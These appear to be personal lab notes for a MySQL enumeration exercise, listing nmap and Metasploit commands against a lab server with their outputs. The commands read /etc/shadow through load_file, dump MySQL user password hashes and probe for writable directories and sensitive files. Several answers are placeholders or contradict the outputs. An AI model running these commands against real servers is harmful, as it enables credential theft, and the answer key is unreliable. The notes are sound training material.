#### Tools
nmap
msfconsole

#### Commands

Connect to mysql server
```
mysql -h target_ip -u root
```

List databse in MySQL Server
```
show databases;
```

Use database
```
use database_name; 
```

Output number of values in database
```
select count(*) from database_name
```

Output all values of authors database
```
select count(*) from database_name; 
```

Get help from mysql
```
help
```

Brute force writeable directories of mysql
```
msfconsole 
use auxiliary/scanner/mysql/mysql_writable_dirs
set dir_list /usr/shrae/metasploit-framework/data/wordlists/directory.txt
setg rhosts target_ip
set verbose false
set username root
advanced
set password ""
run
```

Get hashes of users
```
msfconsole 
use auxiliary/scanner/mysql/mysql_hashdump
options
set username root
set password ""
options
run
```

Check MySQL access with root credentials
```
mysql -h target_ip -u root
```

From root account load etc/shadow file
```
select load_file("/etc/shadow");
```

Check which users have empty passwords
```
nmap target_ip -sV -p 3306 --script=mysql-empty-password
```

Get info of user
```
nmap target_ip -sV -p 3306 --script=mysql-info
```


```
nmap target_ip -sV -p 3306 --script=mysql-users --script-args="mysqluser='root',mysqlpass=''"
```

Get list of databases
```
nmap target_ip -sV -p 3306 --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''"
```

Get list of variables
```
nmap target_ip -sV -p 3306 --script=mysql-varaibles --script-args="mysqluser='root',mysqlpass=''"
```

```
nmap target_ip -sV -p 3306 --script=mysql-varaibles --script-args="mysql-audit.username='root',mysql-aduit.password=''"
```

```
nmap target_ip -sV -p 3306 --script=mysql-varaibles --script-args="mysql-audit.username='root',mysql-aduit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"
```

```
nmap target_ip -sV -p 3306 --script=mysql-dump-hashes --script-args="username='root',password=''"
```

```
nmap target_ip -sV -p 3306 --script=mysql-query --script-args="query='select count(*) from databse_name;'username='root',password=''"
```

#### Questions

1.  What is the version of MySQL server? 
   
```
nmap 192.117.106.3 --script mysql-info.nse 

| mysql-info: 
|   Protocol: 10
|   Version: 5.5.62-0ubuntu0.14.04.1
|   Thread ID: 43
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, IgnoreSigpipes, FoundRows, SupportsTransactions, LongColumnFlag, ODBCClient, ConnectWithDatabase, LongPassword, InteractiveClient, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, SupportsCompression, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: P}DxRq`n*!e^&?L?75D7
|_  Auth Plugin Name: 96
MAC Address: 02:42:C0:75:6A:03 (Unknown)
```
   
2.  What command is used to connect to remote MySQL database?
   
```
mysql -h 192.117.106.3
```
   
3.  How many databases are present on the database server?
   
```
show databases;  

11 databases
```
   
4.  How many records are present in table “authors”? This table is present inside the “books” database.
   
```
show databases; 
use books; 
select * from authors ; 

10 records
```
   
5.  Dump the schema of all databases from the server using suitable metasploit module?
   
```
auxiliary(scanner/mysql/mysql_schemadump)
set USERNAME root 
exploit 

[+] 192.117.106.3:3306    - Schema stored in: /root/.msf4/loot/20240716013208_default_192.117.106.3_mysql_schema_169294.txt
```
   
6.  How many directories present in the /usr/share/metasploit-framework/data/wordlists/directory.txt, are writable? List the names.
   
```
auxiliary(scanner/mysql/mysql_writable_dirs)
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
exploit

/tmp, /root, are writeable

```
   
7.  How many of sensitive files present in /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt are readable? List the names.
   
```
auxiliary(scanner/mysql/mysql_file_enum)
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
exploit

[+] 192.117.106.3:3306    - /etc/passwd is a file and exists
[+] 192.117.106.3:3306    - /etc/shadow is a file and exists
[+] 192.117.106.3:3306    - /etc/group is a file and exists
[+] 192.117.106.3:3306    - /etc/mysql/my.cnf is a file and exists
[+] 192.117.106.3:3306    - /etc/hosts is a file and exists
[+] 192.117.106.3:3306    - /etc/hosts.allow is a file and exists
[+] 192.117.106.3:3306    - /etc/hosts.deny is a file and exists
[+] 192.117.106.3:3306    - /etc/issue is a file and exists
[+] 192.117.106.3:3306    - /etc/fstab is a file and exists
[+] 192.117.106.3:3306    - /proc/version is a file and exists
```
   
8.  Find the system password hash for user "root".
   
```
auxiliary(scanner/mysql/mysql_hashdump)
set USERNAME root

[+] 192.117.106.3:3306    - Saving HashString as Loot: root:
[+] 192.117.106.3:3306    - Saving HashString as Loot: root:
[+] 192.117.106.3:3306    - Saving HashString as Loot: root:
[+] 192.117.106.3:3306    - Saving HashString as Loot: root:
[+] 192.117.106.3:3306    - Saving HashString as Loot: debian-sys-maint:*CDDA79A15EF590ED57BB5933ECD27364809EE90D
[+] 192.117.106.3:3306    - Saving HashString as Loot: root:
[+] 192.117.106.3:3306    - Saving HashString as Loot: filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
[+] 192.117.106.3:3306    - Saving HashString as Loot: ultra:*827EC562775DC9CE458689D36687DCED320F34B0
[+] 192.117.106.3:3306    - Saving HashString as Loot: guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646
[+] 192.117.106.3:3306    - Saving HashString as Loot: sigver:*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
[+] 192.117.106.3:3306    - Saving HashString as Loot: udadmin:*E6DEAD2645D88071D28F004A209691AC60A72AC9
[+] 192.117.106.3:3306    - Saving HashString as Loot: sysadmin:*46CFC7938B60837F46B610A2D10C248874555C14
```
   
9.  How many database users are present on the database server? Lists their names and password hashes.
   
```
auxiliary(scanner/mysql/mysql_hashdump)

[+] 192.117.106.3:3306    - Saving HashString as Loot: root:
[+] 192.117.106.3:3306    - Saving HashString as Loot: root:
[+] 192.117.106.3:3306    - Saving HashString as Loot: root:
[+] 192.117.106.3:3306    - Saving HashString as Loot: root:
[+] 192.117.106.3:3306    - Saving HashString as Loot: debian-sys-maint:*CDDA79A15EF590ED57BB5933ECD27364809EE90D
[+] 192.117.106.3:3306    - Saving HashString as Loot: root:
[+] 192.117.106.3:3306    - Saving HashString as Loot: filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
[+] 192.117.106.3:3306    - Saving HashString as Loot: ultra:*827EC562775DC9CE458689D36687DCED320F34B0
[+] 192.117.106.3:3306    - Saving HashString as Loot: guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646
[+] 192.117.106.3:3306    - Saving HashString as Loot: sigver:*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
[+] 192.117.106.3:3306    - Saving HashString as Loot: udadmin:*E6DEAD2645D88071D28F004A209691AC60A72AC9
[+] 192.117.106.3:3306    - Saving HashString as Loot: sysadmin:*46CFC7938B60837F46B610A2D10C248874555C14

8
```
   
10.  Check whether anonymous login is allowed on MySQL Server.
   
```
 nmap 192.117.106.3 --script mysql-empty-password.nse

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-empty-password: 
|_  root account has empty passwor
```
   
11.  Check whether “InteractiveClient” capability is supported on the MySQL server.
   
```
nmap 192.117.106.3 --script mysql-info.nse 

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.62-0ubuntu0.14.04.1
|   Thread ID: 67
|   Capabilities flags: 63487
|   Some Capabilities: DontAllowDatabaseTableColumn, IgnoreSigpipes, Support41Auth, Speaks41ProtocolNew, SupportsTransactions, LongPassword, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, FoundRows, ODBCClient, SupportsCompression, InteractiveClient, SupportsLoadDataLocal, LongColumnFlag, ConnectWithDatabase, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: xPh</t!Cn~QYLQ1A1rmK
|_  Auth Plugin Name: 96
MAC Address: 02:42:C0:75:6A:03 (Unknown)
It's not
```
   
12.  Enumerate the users present on MySQL database server using mysql-users nmap script.
   
```
 nmap 192.117.106.3 --script mysql-users.nse --script-args "mysqluser=root,mysqlpassword="""

| mysql-users: 
|   filetest
|   root
|   debian-sys-maint
|   guest
|   sigver
|   sysadmin
|   udadmin
|_  ultra
```
   
13.  List all databases stored on the MySQL Server using nmap script.
   
```
nmap 192.117.106.3 --script mysql-databases.nse --script-args "mysqluser=root,mysqlpassword="""

3306/tcp open  mysql
| mysql-databases: 
|   information_schema
|   books
|   data
|   mysql
|   password
|   performance_schema
|   secret
|   store
|   upload
|   vendors
|_  videos
```
   
14.  Find the data directory used by mysql server using nmap script.
   
```

```
   
15.  Check whether File Privileges can be granted to non admin users using mysql_audi nmap script.
   
```

```
   
16.  Dump all user hashes using  nmap script.
   
```
nmap 192.117.106.3 --script mysql-dump-hashes.nse --script-args "username=root,password="""

3306/tcp open  mysql
| mysql-dump-hashes: 
|   debian-sys-maint:*CDDA79A15EF590ED57BB5933ECD27364809EE90D
|   filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
|   ultra:*827EC562775DC9CE458689D36687DCED320F34B0
|   guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646
|   sigver:*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
|   udadmin:*E6DEAD2645D88071D28F004A209691AC60A72AC9
|_  sysadmin:*46CFC7938B60837F46B610A2D10C248874555C14
```
   
17.  Find the number of records stored in table “authors” in database “books” stored on MySQL Server using mysql-query nmap script.
   
```

```
   

#### Answers
1. MySQL 5.5.62-0ubuntu0.14.04.1
2. mysql -h target_ip -u user_name 
3. 11
4. 10
5. mysql_schemadump
6. tmp, root, 2
7. 10, passwd, shadow, group, mysql, hosts, hosts.allow, hosts.deny, issue, fstab, version
8. fdf
9. fdf
10. an
11. It's allowed



Come back to, too many connection errors

#### Note: 
setg - sets the value to a global variable